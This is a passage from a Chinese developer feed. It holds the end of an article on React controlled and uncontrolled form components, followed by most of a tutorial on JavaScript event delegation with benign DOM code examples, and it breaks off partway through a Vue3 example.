<table><thead><tr><th>场景</th><th>推荐方式</th><th>理由</th></tr></thead><tbody><tr><td>登录/注册</td><td>受控组件</td><td>需要校验、联动、错误提示</td></tr><tr><td>评论/留言</td><td>非受控组件</td><td>一次性提交，无需实时处理</td></tr><tr><td>文件上传</td><td>非受控组件</td><td>DOM 内部状态复杂，不适合 React 管理</td></tr><tr><td>实时搜索</td><td>受控组件</td><td>需要即时反馈结果</td></tr><tr><td>富文本编辑器</td><td>非受控组件</td><td>使用第三方库，内部状态独立</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">六、最后的思考：React 的本质是什么？</h2>
<p>React 的核心思想是：<strong>UI 是状态的函数</strong>。</p>
<p>也就是说，页面长什么样，完全取决于当前的状态。</p>
<p>当你使用受控组件时，你是在践行这一理念：<strong>每一个变化，都是状态驱动的结果</strong>。</p>
<p>而当你使用非受控组件时，你实际上是在说：“这个部分我暂时不想管，让它自己玩。”</p>
<p>这不是坏事，但你要清楚地知道：<strong>你在放弃一部分控制权。</strong></p>
<p>所以，不要为了“简洁”而滥用非受控组件，也不要为了“规范”而过度使用受控组件。</p>
<p>我们应该要在“控制”与“放手”之间找到平衡点。</p>
<hr/>
<h2 data-id="heading-7">写在最后</h2>
<p>技术没有绝对的对错，只有合适的时机。</p>
<p>下次面对一个表单时，可以先想想</p>
<blockquote>
<p>“我需要在用户输入的过程中做什么？”</p>
</blockquote>
<p>如果答案是“什么也不做”，那就放手吧。(useRef)<br/>
如果答案是“我要校验、联动、展示”，那就牢牢抓住它。(useState)</p>
<p>这才是 React 表单设计的真正智慧。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[吃透 JS 事件委托：从原理到实战，解锁高性能事件处理方案]]></title>    <link>https://juejin.cn/post/7590020026394492982</link>    <guid>https://juejin.cn/post/7590020026394492982</guid>    <pubDate>2026-01-02T06:56:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026394492982" data-draft-id="7589623325975953460" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="吃透 JS 事件委托：从原理到实战，解锁高性能事件处理方案"/> <meta itemprop="keywords" content="前端,面试"/> <meta itemprop="datePublished" content="2026-01-02T06:56:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不想秃头的程序员"/> <meta itemprop="url" content="https://juejin.cn/user/2754702534251820"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            吃透 JS 事件委托：从原理到实战，解锁高性能事件处理方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2754702534251820/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不想秃头的程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:56:37.000Z" title="Fri Jan 02 2026 06:56:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>事件委托（Event Delegation）是 JavaScript 中最核心的事件处理技巧之一，也是前端面试的高频考点。它基于事件冒泡机制，能大幅减少事件绑定数量、解决动态元素事件失效问题，同时降低内存占用、提升页面性能。本文将从原理拆解、实战场景、性能优化到避坑指南，全方位带你吃透事件委托。</p>
<h2 data-id="heading-0">一、为什么需要事件委托？先看痛点</h2>
<p>在未使用事件委托的场景中，我们通常会给每个元素单独绑定事件，比如一个列表的所有项：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 传统方式：给每个li绑定点击事件</span>
<span class="hljs-keyword">const</span> items = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.list-item'</span>);
items.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
  item.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'点击了列表项：'</span>, item.<span class="hljs-property">textContent</span>);
  });
});
</code></pre>
<p>这种写法会暴露三个核心问题：</p>
<ol>
<li><strong>性能损耗</strong>：如果列表有 1000 个项，就会创建 1000 个事件处理函数，占用大量内存；</li>
<li><strong>动态元素失效</strong>：新增的列表项（如通过 JS 动态添加）不会自动绑定事件，需要重新执行绑定逻辑；</li>
<li><strong>代码冗余</strong>：重复的事件绑定逻辑，增加维护成本。</li>
</ol>
<p>而事件委托能一次性解决这些问题 —— 只给父元素绑定一次事件，就能处理所有子元素的事件触发。</p>
<h2 data-id="heading-1">二、事件委托的核心原理：事件流</h2>
<p>要理解事件委托，必须先掌握 DOM 事件流的三个阶段：</p>
<ol>
<li><strong>捕获阶段</strong>：事件从 window 向下传播到目标元素（从外到内）；</li>
<li><strong>目标阶段</strong>：事件到达目标元素本身；</li>
<li><strong>冒泡阶段</strong>：事件从目标元素向上传播回 window（从内到外）。</li>
</ol>
<p>事件委托的核心逻辑是：<strong>利用事件冒泡，将子元素的事件绑定到父元素（甚至根元素）上，通过判断事件源（target）来区分具体触发的子元素</strong>。</p>
<p>举个直观的例子：点击列表中的<code>&lt;li&gt;</code>，事件会先触发<code>&lt;li&gt;</code>的 click 事件，然后冒泡到<code>&lt;ul&gt;</code>、<code>&lt;div&gt;</code>，直到<code>document</code>和<code>window</code>。我们只需要在<code>&lt;ul&gt;</code>上绑定一次事件，就能捕获所有<code>&lt;li&gt;</code>的点击行为。</p>
<h2 data-id="heading-2">三、基础实战：实现一个列表的事件委托</h2>
<h3 data-id="heading-3">1. 核心实现代码</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"list"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"item-list"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-item"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"1"</span>&gt;</span>列表项1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-item"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"2"</span>&gt;</span>列表项2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-item"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"3"</span>&gt;</span>列表项3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"addItem"</span>&gt;</span>新增列表项<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// 父元素绑定事件（只绑定一次）</span>
<span class="hljs-keyword">const</span> list = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'list'</span>);
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-comment">// 核心：判断触发事件的目标元素</span>
  <span class="hljs-keyword">const</span> target = e.<span class="hljs-property">target</span>;
  <span class="hljs-comment">// 确认点击的是列表项（避免点击ul空白处触发）</span>
  <span class="hljs-keyword">if</span> (target.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'list-item'</span>)) {
    <span class="hljs-keyword">const</span> id = target.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`点击了列表项<span class="hljs-subst">${id}</span>：`</span>, target.<span class="hljs-property">textContent</span>);
  }
});

<span class="hljs-comment">// 动态新增列表项（无需重新绑定事件）</span>
<span class="hljs-keyword">const</span> addItem = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'addItem'</span>);
<span class="hljs-keyword">let</span> index = <span class="hljs-number">4</span>;
addItem.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> li = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'li'</span>);
  li.<span class="hljs-property">className</span> = <span class="hljs-string">'list-item'</span>;
  li.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span> = index;
  li.<span class="hljs-property">textContent</span> = <span class="hljs-string">`列表项<span class="hljs-subst">${index}</span>`</span>;
  list.<span class="hljs-title function_">appendChild</span>(li);
  index++;
});
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-4">2. 关键知识点解析</h3>
<ul>
<li><strong>e.target</strong>：触发事件的原始元素（比如点击的<code>&lt;li&gt;</code>）；</li>
<li><strong>e.currentTarget</strong>：绑定事件的元素（这里是<code>&lt;ul&gt;</code>）；</li>
<li><strong>类名 / 属性判断</strong>：通过<code>classList</code>、<code>dataset</code>等方式精准匹配目标元素，避免非目标元素触发逻辑；</li>
<li><strong>动态元素兼容</strong>：新增的<code>&lt;li&gt;</code>无需重新绑定事件，因为事件委托在父元素上，天然支持动态元素。</li>
</ul>
<h2 data-id="heading-5">四、进阶场景：精细化事件委托</h2>
<p>实际开发中，事件委托的场景往往更复杂，比如多层嵌套、多类型事件、需要阻止冒泡等，以下是高频进阶用法：</p>
<h3 data-id="heading-6">1. 多层嵌套元素的委托</h3>
<p>当目标元素嵌套在其他元素中（比如<code>&lt;li&gt;</code>里有<code>&lt;span&gt;</code>、<code>&lt;button&gt;</code>），需要通过<code>closest</code>找到最外层的目标元素：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"list"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-item"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"1"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>列表项1<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"delete-btn"</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> list = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'list'</span>);
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-comment">// 找到最近的list-item（解决点击子元素触发的问题）</span>
  <span class="hljs-keyword">const</span> item = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'.list-item'</span>);
  <span class="hljs-keyword">if</span> (item) {
    <span class="hljs-comment">// 区分点击的是列表项还是删除按钮</span>
    <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'delete-btn'</span>)) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`删除列表项<span class="hljs-subst">${item.dataset.id}</span>`</span>);
      item.<span class="hljs-title function_">remove</span>();
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`点击列表项<span class="hljs-subst">${item.dataset.id}</span>`</span>);
    }
  }
});
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>closest</code>方法会从当前元素向上查找，返回匹配选择器的第一个祖先元素（包括自身），是处理嵌套元素的最佳方案。</p>
<h3 data-id="heading-7">2. 多类型事件的统一委托</h3>
<p>可以在父元素上绑定多个事件类型，或通过一个处理函数区分不同事件：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 一个处理函数处理多个事件类型</span>
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleItemEvent);
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseenter'</span>, handleItemEvent);
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseleave'</span>, handleItemEvent);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleItemEvent</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-keyword">const</span> item = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'.list-item'</span>);
  <span class="hljs-keyword">if</span> (!item) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">switch</span>(e.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'click'</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'点击：'</span>, item.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">'mouseenter'</span>:
      item.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">'#f5f5f5'</span>;
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">'mouseleave'</span>:
      item.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">''</span>;
      <span class="hljs-keyword">break</span>;
  }
}
</code></pre>
<h3 data-id="heading-8">3. 委托到 document/body（全局委托）</h3>
<p>对于全局范围内的动态元素（如弹窗、动态按钮），可以将事件委托到<code>document</code>或<code>body</code>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 全局委托：处理所有动态生成的按钮</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'dynamic-btn'</span>)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'点击了动态按钮：'</span>, e.<span class="hljs-property">target</span>.<span class="hljs-property">textContent</span>);
  }
});

<span class="hljs-comment">// 动态创建按钮</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'button'</span>);
  btn.<span class="hljs-property">className</span> = <span class="hljs-string">'dynamic-btn'</span>;
  btn.<span class="hljs-property">textContent</span> = <span class="hljs-string">'动态按钮'</span>;
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(btn);
}, <span class="hljs-number">1000</span>);
</code></pre>
<p>⚠️ 注意：全局委托虽方便，但不要滥用 ——<code>document</code>上的事件会监听整个页面的点击，过多的全局委托会增加事件处理的耗时，建议优先委托到最近的父元素。</p>
<h2 data-id="heading-9">五、性能优化：让事件委托更高效</h2>
<p>事件委托本身是高性能方案，但不当使用仍会产生性能问题，以下是优化技巧：</p>
<h3 data-id="heading-10">1. 选择最近的父元素</h3>
<p>尽量避免直接委托到<code>document</code>/<code>body</code>，而是选择离目标元素最近的固定父元素。比如列表的事件委托到<code>&lt;ul&gt;</code>，而非<code>document</code>，减少事件传播的层级和处理函数的触发次数。</p>
<h3 data-id="heading-11">2. 节流 / 防抖处理高频事件</h3>
<p>如果委托的是<code>scroll</code>、<code>resize</code>、<code>mousemove</code>等高频事件，必须结合节流 / 防抖：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 节流函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">throttle</span>(<span class="hljs-params">fn, delay = <span class="hljs-number">100</span></span>) {
  <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!timer) {
      timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
        timer = <span class="hljs-literal">null</span>;
      }, delay);
    }
  };
}

<span class="hljs-comment">// 委托scroll事件（节流处理）</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-title function_">throttle</span>(<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-comment">// 处理滚动逻辑</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'滚动了'</span>);
}, <span class="hljs-number">200</span>));
</code></pre>
<h3 data-id="heading-12">3. 及时移除无用的委托事件</h3>
<p>如果委托的父元素被销毁（比如弹窗关闭），要及时移除事件监听，避免内存泄漏：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'modal'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleModalClick</span> = (<span class="hljs-params">e</span>) =&gt; {
  <span class="hljs-comment">// 弹窗内的事件逻辑</span>
};

<span class="hljs-comment">// 绑定事件</span>
modal.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleModalClick);

<span class="hljs-comment">// 弹窗关闭时移除事件</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">closeModal</span>(<span class="hljs-params"/>) {
  modal.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleModalClick);
  modal.<span class="hljs-title function_">remove</span>();
}
</code></pre>
<h2 data-id="heading-13">六、避坑指南：事件委托的常见问题</h2>
<h3 data-id="heading-14">1. 事件被阻止冒泡</h3>
<p>如果子元素的事件处理函数中调用了<code>e.stopPropagation()</code>，会导致事件无法冒泡到父元素，委托失效：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 错误示例：子元素阻止冒泡，委托失效</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.list-item'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// 阻止冒泡</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素点击'</span>);
});

<span class="hljs-comment">// 父元素的委托事件不会触发</span>
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'委托事件'</span>); <span class="hljs-comment">// 不会执行</span>
});
</code></pre>
<p>✅ 解决方案：避免在子元素中随意阻止冒泡，若必须阻止，需确保不影响委托逻辑。</p>
<h3 data-id="heading-15">2. 目标元素是不可冒泡的事件</h3>
<p>部分事件不支持冒泡（如<code>focus</code>、<code>blur</code>、<code>mouseenter</code>、<code>mouseleave</code>），直接委托会失效：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 错误示例：mouseenter不冒泡，委托失效</span>
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseenter'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'鼠标进入列表项'</span>); <span class="hljs-comment">// 不会触发</span>
});
</code></pre>
<p>✅ 解决方案：使用事件捕获模式（第三个参数设为<code>true</code>）：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 捕获模式处理不冒泡的事件</span>
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseenter'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> item = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'.list-item'</span>);
  <span class="hljs-keyword">if</span> (item) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'鼠标进入列表项'</span>);
  }
}, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 开启捕获模式</span>
</code></pre>
<h3 data-id="heading-16">3. 动态修改元素的类名 / 属性</h3>
<p>如果目标元素的类名、<code>dataset</code>等用于判断的属性被动态修改，可能导致委托逻辑失效：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 动态修改类名后，委托无法匹配</span>
<span class="hljs-keyword">const</span> item = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.list-item'</span>);
item.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'list-item'</span>); <span class="hljs-comment">// 移除类名</span>
<span class="hljs-comment">// 此时点击该元素，委托逻辑不会触发</span>
</code></pre>
<p>✅ 解决方案：尽量使用稳定的标识（如固定的<code>data-*</code>属性），而非易变的类名。</p>
<h2 data-id="heading-17">七、框架中的事件委托（Vue/React）</h2>
<p>现代前端框架虽封装了事件处理，但底层仍基于事件委托，且有专属的使用方式：</p>
<h3 data-id="heading-18">1. Vue3 中的事件委托</h3>
<p>Vue 的<code>v-on</code>（<code>@</code>）指令默认会利用事件委托（绑定到组件根元素），也可手动实现精细化委托：</p>
<pre><code class="hljs language-js" lang="js">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleListClick"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in list"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span> <span class="hljs-attr">:data-id</span>=<span class="hljs-string">"item.id"</span>&gt;</span>
      {{ item.name }}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"delete-btn"</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
&lt;/template&gt;

